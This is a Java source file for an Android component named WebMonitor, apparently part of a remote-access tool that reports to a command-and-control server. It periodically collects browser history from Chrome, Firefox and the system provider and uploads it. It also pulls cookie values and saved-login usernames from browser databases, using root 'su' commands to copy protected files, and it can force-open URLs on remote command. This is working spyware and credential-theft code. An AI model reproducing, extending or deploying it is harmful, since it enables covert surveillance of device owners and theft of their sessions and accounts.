package com.tarjon.admin.utils;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.os.Environment;
import android.provider.Browser;
import android.util.Log;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Monitors web browsing activity and browser data
 */
public class WebMonitor {
    private static final String TAG = "WebMonitor";
    
    private final Context context;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    private final ScheduledExecutorService scheduledExecutor;
    
    // Common browser package names
    private static final Map<String, String> BROWSERS = new HashMap<>();
    
    static {
        BROWSERS.put("com.android.chrome", "Chrome");
        BROWSERS.put("org.mozilla.firefox", "Firefox");
        BROWSERS.put("com.opera.browser", "Opera");
        BROWSERS.put("com.brave.browser", "Brave");
        BROWSERS.put("com.opera.mini.native", "Opera Mini");
        BROWSERS.put("com.microsoft.emmx", "Edge");
        BROWSERS.put("com.UCMobile.intl", "UC Browser");
        BROWSERS.put("com.duckduckgo.mobile.android", "DuckDuckGo");
        BROWSERS.put("com.android.browser", "AOSP Browser");
        BROWSERS.put("com.sec.android.app.sbrowser", "Samsung Browser");
        BROWSERS.put("com.huawei.browser", "Huawei Browser");
        BROWSERS.put("com.mi.globalbrowser", "Mi Browser");
    }
    
    // Browser database paths
    private static final Map<String, String[]> BROWSER_DB_PATHS = new HashMap<>();
    
    static {
        // Chrome browser database paths
        BROWSER_DB_PATHS.put("com.android.chrome", new String[]{
                "/data/data/com.android.chrome/app_chrome/Default/History",
                "/data/data/com.android.chrome/app_chrome/Default/Cookies",
                "/data/data/com.android.chrome/app_chrome/Default/Login Data"
        });
        
        // Firefox browser database paths
        BROWSER_DB_PATHS.put("org.mozilla.firefox", new String[]{
                "/data/data/org.mozilla.firefox/files/mozilla/*.default/browser.db",
                "/data/data/org.mozilla.firefox/files/mozilla/*.default/cookies.sqlite",
                "/data/data/org.mozilla.firefox/files/mozilla/*.default/logins.sqlite"
        });
    }
    
    // Monitoring interval (in minutes)
    private static final int MONITORING_INTERVAL = 30;
    
    // Monitoring state
    private boolean isMonitoring = false;
    
    public WebMonitor(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        this.executor = Executors.newSingleThreadExecutor();
        this.scheduledExecutor = Executors.newScheduledThreadPool(1);
    }
    
    /**
     * Start monitoring web activity
     */
    public void startMonitoring() {
        if (isMonitoring) {
            return;
        }
        
        isMonitoring = true;
        
        // Schedule periodic monitoring
        scheduledExecutor.scheduleAtFixedRate(
                this::monitorWebActivity,
                0,
                MONITORING_INTERVAL,
                TimeUnit.MINUTES
        );
        
        c2Connection.sendCommandResult("web_monitoring", 
                "Web activity monitoring started");
    }
    
    /**
     * Stop monitoring web activity
     */
    public void stopMonitoring() {
        if (!isMonitoring) {
            return;
        }
        
        isMonitoring = false;
        
        if (scheduledExecutor != null && !scheduledExecutor.isShutdown()) {
            scheduledExecutor.shutdownNow();
        }
        
        c2Connection.sendCommandResult("web_monitoring", 
                "Web activity monitoring stopped");
    }
    
    /**
     * Monitor web activity by checking browser histories
     */
    private void monitorWebActivity() {
        executor.execute(() -> {
            try {
                // Get browser history from system provider
                JSONObject systemBrowserHistory = getSystemBrowserHistory();
                
                // Get browser history from installed browsers
                JSONObject browserHistories = new JSONObject();
                
                for (String browserPackage : BROWSERS.keySet()) {
                    try {
                        // Check if browser is installed
                        PackageManager pm = context.getPackageManager();
                        pm.getPackageInfo(browserPackage, 0);
                        
                        // Get browser history
                        JSONObject browserHistory = getBrowserHistory(browserPackage);
                        if (browserHistory != null) {
                            browserHistories.put(BROWSERS.get(browserPackage), browserHistory);
                        }
                    } catch (PackageManager.NameNotFoundException e) {
                        // Browser not installed, skip
                    } catch (Exception e) {
                        Log.e(TAG, "Error getting history for " + browserPackage + ": " + e.getMessage());
                    }
                }
                
                // Combine results
                JSONObject result = new JSONObject();
                result.put("systemBrowser", systemBrowserHistory);
                result.put("browsers", browserHistories);
                result.put("timestamp", System.currentTimeMillis());
                
                // Send to C2 server
                c2Connection.sendCommandResult("web_history", 
                        "Browser history updated", 
                        result.toString());
                
            } catch (Exception e) {
                Log.e(TAG, "Error monitoring web activity: " + e.getMessage());
            }
        });
    }
    
    /**
     * Get browser history from system provider
     */
    private JSONObject getSystemBrowserHistory() {
        JSONObject result = new JSONObject();
        JSONArray historyItems = new JSONArray();
        
        try {
            String[] projection = new String[] {
                    Browser.BookmarkColumns.TITLE,
                    Browser.BookmarkColumns.URL,
                    Browser.BookmarkColumns.DATE
            };
            
            String sortOrder = Browser.BookmarkColumns.DATE + " DESC";
            
            Cursor cursor = context.getContentResolver().query(
                    Browser.BOOKMARKS_URI,
                    projection,
                    null,
                    null,
                    sortOrder);
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject item = new JSONObject();
                    
                    String title = cursor.getString(cursor.getColumnIndexOrThrow(Browser.BookmarkColumns.TITLE));
                    String url = cursor.getString(cursor.getColumnIndexOrThrow(Browser.BookmarkColumns.URL));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(Browser.BookmarkColumns.DATE));
                    
                    item.put("title", title != null ? title : "");
                    item.put("url", url != null ? url : "");
                    item.put("date", date);
                    item.put("dateStr", new java.util.Date(date).toString());
                    
                    historyItems.put(item);
                    
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            result.put("history", historyItems);
            result.put("count", historyItems.length());
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting system browser history: " + e.getMessage());
            try {
                result.put("error", "Error getting system browser history: " + e.getMessage());
            } catch (JSONException je) {
                // Ignore
            }
        }
        
        return result;
    }
    
    /**
     * Get browser history from a specific browser
     */
    private JSONObject getBrowserHistory(String browserPackage) {
        JSONObject result = new JSONObject();
        
        try {
            // Check if we have paths for this browser
            String[] dbPaths = BROWSER_DB_PATHS.get(browserPackage);
            if (dbPaths == null) {
                return null;
            }
            
            // Find history database file
            String historyDbPath = findDatabaseFile(dbPaths[0]);
            if (historyDbPath == null) {
                return null;
            }
            
            // Create result structure
            result.put("package", browserPackage);
            result.put("name", BROWSERS.get(browserPackage));
            
            // If root access is not available, we can't access the database files directly
            // In this case, try to use the browser's ContentProvider if available
            if (historyDbPath.startsWith("/data/data/") && !canAccessPath(historyDbPath)) {
                // For Chrome, we can try to use ContentProvider
                if (browserPackage.equals("com.android.chrome")) {
                    return getChromeHistoryViaProvider();
                }
                
                // For other browsers, return empty result
                result.put("history", new JSONArray());
                result.put("count", 0);
                result.put("error", "Cannot access browser database files (no root)");
                return result;
            }
            
            // Access database file directly (requires root)
            JSONArray historyItems = readHistoryFromDatabase(historyDbPath, browserPackage);
            result.put("history", historyItems);
            result.put("count", historyItems.length());
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting browser history for " + browserPackage + ": " + e.getMessage());
            try {
                result.put("error", "Error getting browser history: " + e.getMessage());
                result.put("history", new JSONArray());
                result.put("count", 0);
            } catch (JSONException je) {
                // Ignore
            }
        }
        
        return result;
    }
    
    /**
     * Find the actual path to a database file
     */
    private String findDatabaseFile(String pathPattern) {
        // If path contains wildcard, expand it
        if (pathPattern.contains("*")) {
            String directory = pathPattern.substring(0, pathPattern.lastIndexOf('/'));
            String filePattern = pathPattern.substring(pathPattern.lastIndexOf('/') + 1);
            
            File dir = new File(directory);
            if (!dir.exists() || !dir.isDirectory()) {
                return null;
            }
            
            // Find matching files
            String[] matchingFiles = dir.list((dir1, name) -> {
                return name.matches(filePattern.replace("*", ".*"));
            });
            
            if (matchingFiles != null && matchingFiles.length > 0) {
                return directory + "/" + matchingFiles[0];
            }
            
            return null;
        }
        
        // Otherwise, check if file exists
        File file = new File(pathPattern);
        if (file.exists()) {
            return pathPattern;
        }
        
        return null;
    }
    
    /**
     * Check if we can access a path (root check)
     */
    private boolean canAccessPath(String path) {
        try {
            File file = new File(path);
            return file.canRead();
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Get Chrome history via ContentProvider
     */
    private JSONObject getChromeHistoryViaProvider() {
        JSONObject result = new JSONObject();
        JSONArray historyItems = new JSONArray();
        
        try {
            // Chrome history provider
            Uri uri = Uri.parse("content://com.android.chrome.browser/history");
            
            try {
                Cursor cursor = context.getContentResolver().query(
                        uri,
                        null,
                        null,
                        null,
                        null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject item = new JSONObject();
                        
                        // Get column names
                        String[] columnNames = cursor.getColumnNames();
                        
                        // Find title and URL columns
                        int titleIndex = -1;
                        int urlIndex = -1;
                        int dateIndex = -1;
                        
                        for (int i = 0; i < columnNames.length; i++) {
                            String columnName = columnNames[i].toLowerCase();
                            if (columnName.contains("title")) {
                                titleIndex = i;
                            } else if (columnName.contains("url")) {
                                urlIndex = i;
                            } else if (columnName.contains("date") || columnName.contains("time")) {
                                dateIndex = i;
                            }
                        }
                        
                        // Extract data
                        String title = titleIndex >= 0 ? cursor.getString(titleIndex) : "";
                        String url = urlIndex >= 0 ? cursor.getString(urlIndex) : "";
                        long date = dateIndex >= 0 ? cursor.getLong(dateIndex) : 0;
                        
                        item.put("title", title != null ? title : "");
                        item.put("url", url != null ? url : "");
                        item.put("date", date);
                        item.put("dateStr", date > 0 ? new java.util.Date(date).toString() : "");
                        
                        historyItems.put(item);
                        
                    } while (cursor.moveToNext());
                    
                    cursor.close();
                }
            } catch (Exception e) {
                // Provider not available or permission denied
                Log.e(TAG, "Error accessing Chrome provider: " + e.getMessage());
            }
            
            result.put("package", "com.android.chrome");
            result.put("name", "Chrome");
            result.put("history", historyItems);
            result.put("count", historyItems.length());
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting Chrome history: " + e.getMessage());
            try {
                result.put("error", "Error getting Chrome history: " + e.getMessage());
                result.put("history", new JSONArray());
                result.put("count", 0);
            } catch (JSONException je) {
                // Ignore
            }
        }
        
        return result;
    }
    
    /**
     * Read history from database file
     */
    private JSONArray readHistoryFromDatabase(String dbPath, String browserPackage) {
        JSONArray historyItems = new JSONArray();
        
        try {
            // If we can't read the file directly, try copying it first (for root access)
            File dbFile = new File(dbPath);
            if (!dbFile.canRead()) {
                String tempPath = copyDatabaseFile(dbPath);
                if (tempPath != null) {
                    dbPath = tempPath;
                } else {
                    return historyItems; // Empty array if we can't access
                }
            }
            
            // Open database
            SQLiteDatabase db = SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY);
            
            // Query depends on browser
            if (browserPackage.equals("com.android.chrome")) {
                // Chrome database schema
                Cursor cursor = db.rawQuery(
                        "SELECT title, url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100",
                        null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject item = new JSONObject();
                        
                        String title = cursor.getString(0);
                        String url = cursor.getString(1);
                        long time = cursor.getLong(2);
                        
                        // Chrome stores time as microseconds since 1601-01-01
                        // Convert to milliseconds since 1970-01-01
                        long date = (time / 1000) - 11644473600000L;
                        
                        item.put("title", title != null ? title : "");
                        item.put("url", url != null ? url : "");
                        item.put("date", date);
                        item.put("dateStr", new java.util.Date(date).toString());
                        
                        historyItems.put(item);
                        
                    } while (cursor.moveToNext());
                    
                    cursor.close();
                }
            } else if (browserPackage.equals("org.mozilla.firefox")) {
                // Firefox database schema
                Cursor cursor = db.rawQuery(
                        "SELECT title, url, date FROM history ORDER BY date DESC LIMIT 100",
                        null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject item = new JSONObject();
                        
                        String title = cursor.getString(0);
                        String url = cursor.getString(1);
                        long date = cursor.getLong(2);
                        
                        // Firefox stores time as microseconds
                        date = date / 1000;
                        
                        item.put("title", title != null ? title : "");
                        item.put("url", url != null ? url : "");
                        item.put("date", date);
                        item.put("dateStr", new java.util.Date(date).toString());
                        
                        historyItems.put(item);
                        
                    } while (cursor.moveToNext());
                    
                    cursor.close();
                }
            }
            
            // Close database
            db.close();
            
            // Remove temporary file if created
            if (dbPath.startsWith(context.getCacheDir().getAbsolutePath())) {
                new File(dbPath).delete();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error reading history database: " + e.getMessage());
        }
        
        return historyItems;
    }
    
    /**
     * Copy database file to accessible location (for root access)
     */
    private String copyDatabaseFile(String dbPath) {
        try {
            // Execute command to copy file
            Process process = Runtime.getRuntime().exec("su");
            java.io.DataOutputStream os = new java.io.DataOutputStream(process.getOutputStream());
            
            // Create temporary file
            File tempFile = File.createTempFile("browser_db", ".db", context.getCacheDir());
            String tempPath = tempFile.getAbsolutePath();
            
            // Copy file with root permissions
            os.writeBytes("cat " + dbPath + " > " + tempPath + "\n");
            os.writeBytes("chmod 666 " + tempPath + "\n");
            os.writeBytes("exit\n");
            os.flush();
            
            // Wait for process to complete
            process.waitFor();
            
            // Check if file was copied successfully
            if (tempFile.exists() && tempFile.length() > 0) {
                return tempPath;
            }
            
            return null;
        } catch (Exception e) {
            Log.e(TAG, "Error copying database file: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * Get browser cookies
     */
    public void getBrowserCookies(String browserPackage, final WebDataCallback callback) {
        executor.execute(() -> {
            try {
                // Check if browser is installed
                try {
                    PackageManager pm = context.getPackageManager();
                    pm.getPackageInfo(browserPackage, 0);
                } catch (PackageManager.NameNotFoundException e) {
                    if (callback != null) {
                        callback.onError("Browser not installed: " + browserPackage);
                    }
                    return;
                }
                
                // Check if we have paths for this browser
                String[] dbPaths = BROWSER_DB_PATHS.get(browserPackage);
                if (dbPaths == null || dbPaths.length < 2) {
                    if (callback != null) {
                        callback.onError("No cookie database paths for browser: " + browserPackage);
                    }
                    return;
                }
                
                // Find cookie database file
                String cookieDbPath = findDatabaseFile(dbPaths[1]);
                if (cookieDbPath == null) {
                    if (callback != null) {
                        callback.onError("Cookie database not found for browser: " + browserPackage);
                    }
                    return;
                }
                
                // Check if we can access the file
                if (cookieDbPath.startsWith("/data/data/") && !canAccessPath(cookieDbPath)) {
                    if (callback != null) {
                        callback.onError("Cannot access browser cookie database (no root)");
                    }
                    return;
                }
                
                // Read cookies from database
                JSONArray cookies = readCookiesFromDatabase(cookieDbPath, browserPackage);
                
                // Create result
                JSONObject result = new JSONObject();
                result.put("package", browserPackage);
                result.put("name", BROWSERS.get(browserPackage));
                result.put("cookies", cookies);
                result.put("count", cookies.length());
                
                if (callback != null) {
                    callback.onDataRetrieved(result.toString());
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error getting browser cookies: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error getting browser cookies: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Read cookies from database file
     */
    private JSONArray readCookiesFromDatabase(String dbPath, String browserPackage) {
        JSONArray cookieItems = new JSONArray();
        
        try {
            // If we can't read the file directly, try copying it first (for root access)
            File dbFile = new File(dbPath);
            if (!dbFile.canRead()) {
                String tempPath = copyDatabaseFile(dbPath);
                if (tempPath != null) {
                    dbPath = tempPath;
                } else {
                    return cookieItems; // Empty array if we can't access
                }
            }
            
            // Open database
            SQLiteDatabase db = SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY);
            
            // Query depends on browser
            if (browserPackage.equals("com.android.chrome")) {
                // Chrome database schema
                Cursor cursor = db.rawQuery(
                        "SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly FROM cookies",
                        null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject item = new JSONObject();
                        
                        String host = cursor.getString(0);
                        String name = cursor.getString(1);
                        String value = cursor.getString(2);
                        String path = cursor.getString(3);
                        long expires = cursor.getLong(4);
                        boolean secure = cursor.getInt(5) != 0;
                        boolean httpOnly = cursor.getInt(6) != 0;
                        
                        // Chrome stores time as microseconds since 1601-01-01
                        // Convert to milliseconds since 1970-01-01
                        long expiresDate = (expires / 1000) - 11644473600000L;
                        
                        item.put("host", host != null ? host : "");
                        item.put("name", name != null ? name : "");
                        item.put("value", value != null ? value : "");
                        item.put("path", path != null ? path : "");
                        item.put("expires", expiresDate);
                        item.put("expiresStr", expiresDate > 0 ? new java.util.Date(expiresDate).toString() : "");
                        item.put("secure", secure);
                        item.put("httpOnly", httpOnly);
                        
                        cookieItems.put(item);
                        
                    } while (cursor.moveToNext());
                    
                    cursor.close();
                }
            } else if (browserPackage.equals("org.mozilla.firefox")) {
                // Firefox database schema
                Cursor cursor = db.rawQuery(
                        "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies",
                        null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject item = new JSONObject();
                        
                        String host = cursor.getString(0);
                        String name = cursor.getString(1);
                        String value = cursor.getString(2);
                        String path = cursor.getString(3);
                        long expires = cursor.getLong(4);
                        boolean secure = cursor.getInt(5) != 0;
                        boolean httpOnly = cursor.getInt(6) != 0;
                        
                        // Firefox stores time as seconds since 1970-01-01
                        // Convert to milliseconds
                        long expiresDate = expires * 1000;
                        
                        item.put("host", host != null ? host : "");
                        item.put("name", name != null ? name : "");
                        item.put("value", value != null ? value : "");
                        item.put("path", path != null ? path : "");
                        item.put("expires", expiresDate);
                        item.put("expiresStr", expiresDate > 0 ? new java.util.Date(expiresDate).toString() : "");
                        item.put("secure", secure);
                        item.put("httpOnly", httpOnly);
                        
                        cookieItems.put(item);
                        
                    } while (cursor.moveToNext());
                    
                    cursor.close();
                }
            }
            
            // Close database
            db.close();
            
            // Remove temporary file if created
            if (dbPath.startsWith(context.getCacheDir().getAbsolutePath())) {
                new File(dbPath).delete();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error reading cookie database: " + e.getMessage());
        }
        
        return cookieItems;
    }
    
    /**
     * Get browser saved passwords
     */
    public void getBrowserPasswords(String browserPackage, final WebDataCallback callback) {
        executor.execute(() -> {
            try {
                // Check if browser is installed
                try {
                    PackageManager pm = context.getPackageManager();
                    pm.getPackageInfo(browserPackage, 0);
                } catch (PackageManager.NameNotFoundException e) {
                    if (callback != null) {
                        callback.onError("Browser not installed: " + browserPackage);
                    }
                    return;
                }
                
                // Check if we have paths for this browser
                String[] dbPaths = BROWSER_DB_PATHS.get(browserPackage);
                if (dbPaths == null || dbPaths.length < 3) {
                    if (callback != null) {
                        callback.onError("No password database paths for browser: " + browserPackage);
                    }
                    return;
                }
                
                // Find password database file
                String passwordDbPath = findDatabaseFile(dbPaths[2]);
                if (passwordDbPath == null) {
                    if (callback != null) {
                        callback.onError("Password database not found for browser: " + browserPackage);
                    }
                    return;
                }
                
                // Check if we can access the file
                if (passwordDbPath.startsWith("/data/data/") && !canAccessPath(passwordDbPath)) {
                    if (callback != null) {
                        callback.onError("Cannot access browser password database (no root)");
                    }
                    return;
                }
                
                // Read passwords from database
                JSONArray passwords = readPasswordsFromDatabase(passwordDbPath, browserPackage);
                
                // Create result
                JSONObject result = new JSONObject();
                result.put("package", browserPackage);
                result.put("name", BROWSERS.get(browserPackage));
                result.put("passwords", passwords);
                result.put("count", passwords.length());
                
                if (callback != null) {
                    callback.onDataRetrieved(result.toString());
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error getting browser passwords: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error getting browser passwords: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Read passwords from database file
     */
    private JSONArray readPasswordsFromDatabase(String dbPath, String browserPackage) {
        JSONArray passwordItems = new JSONArray();
        
        try {
            // If we can't read the file directly, try copying it first (for root access)
            File dbFile = new File(dbPath);
            if (!dbFile.canRead()) {
                String tempPath = copyDatabaseFile(dbPath);
                if (tempPath != null) {
                    dbPath = tempPath;
                } else {
                    return passwordItems; // Empty array if we can't access
                }
            }
            
            // Open database
            SQLiteDatabase db = SQLiteDatabase.openDatabase(dbPath, null, SQLiteDatabase.OPEN_READONLY);
            
            // Query depends on browser
            if (browserPackage.equals("com.android.chrome")) {
                // Chrome database schema
                Cursor cursor = db.rawQuery(
                        "SELECT origin_url, username_value, password_value FROM logins",
                        null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject item = new JSONObject();
                        
                        String url = cursor.getString(0);
                        String username = cursor.getString(1);
                        
                        // Password is encrypted, we can't decrypt it without root and proper tools
                        // Just note that it exists
                        
                        item.put("url", url != null ? url : "");
                        item.put("username", username != null ? username : "");
                        item.put("hasPassword", true);
                        
                        passwordItems.put(item);
                        
                    } while (cursor.moveToNext());
                    
                    cursor.close();
                }
            } else if (browserPackage.equals("org.mozilla.firefox")) {
                // Firefox database schema
                Cursor cursor = db.rawQuery(
                        "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins",
                        null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject item = new JSONObject();
                        
                        String url = cursor.getString(0);
                        
                        // Username and password are encrypted, we can't decrypt them
                        // Just note that they exist
                        
                        item.put("url", url != null ? url : "");
                        item.put("hasUsername", true);
                        item.put("hasPassword", true);
                        
                        passwordItems.put(item);
                        
                    } while (cursor.moveToNext());
                    
                    cursor.close();
                }
            }
            
            // Close database
            db.close();
            
            // Remove temporary file if created
            if (dbPath.startsWith(context.getCacheDir().getAbsolutePath())) {
                new File(dbPath).delete();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error reading password database: " + e.getMessage());
        }
        
        return passwordItems;
    }
    
    /**
     * Force open a specific URL in the browser
     * @param url URL to open
     * @param browserPackage Specific browser package to use, or null for default
     */
    public void openUrl(String url, String browserPackage) {
        try {
            // Create intent
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            
            // Specify browser if requested
            if (browserPackage != null && !browserPackage.isEmpty()) {
                try {
                    // Check if browser is installed
                    PackageManager pm = context.getPackageManager();
                    pm.getPackageInfo(browserPackage, 0);
                    
                    // Set specific browser
                    intent.setPackage(browserPackage);
                } catch (PackageManager.NameNotFoundException e) {
                    // Browser not installed, use default
                    Log.e(TAG, "Browser not installed: " + browserPackage);
                }
            }
            
            // Open URL
            context.startActivity(intent);
            
            // Log event
            c2Connection.sendCommandResult("open_url", 
                    "URL opened: " + url);
            
        } catch (Exception e) {
            Log.e(TAG, "Error opening URL: " + e.getMessage());
            c2Connection.sendCommandResult("open_url_error", 
                    "Error opening URL: " + e.getMessage());
        }
    }
    
    /**
     * Get list of installed browsers
     */
    public List<String> getInstalledBrowsers() {
        List<String> installedBrowsers = new ArrayList<>();
        
        for (String browserPackage : BROWSERS.keySet()) {
            try {
                PackageManager pm = context.getPackageManager();
                pm.getPackageInfo(browserPackage, 0);
                installedBrowsers.add(browserPackage);
            } catch (PackageManager.NameNotFoundException e) {
                // Browser not installed, skip
            }
        }
        
        return installedBrowsers;
    }
    
    /**
     * Clean up resources
     */
    public void release() {
        stopMonitoring();
        
        if (scheduledExecutor != null && !scheduledExecutor.isShutdown()) {
            scheduledExecutor.shutdownNow();
        }
        
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
    
    /**
     * Callback interface for web data operations
     */
    public interface WebDataCallback {
        void onDataRetrieved(String dataJson);
        void onError(String error);
    }
}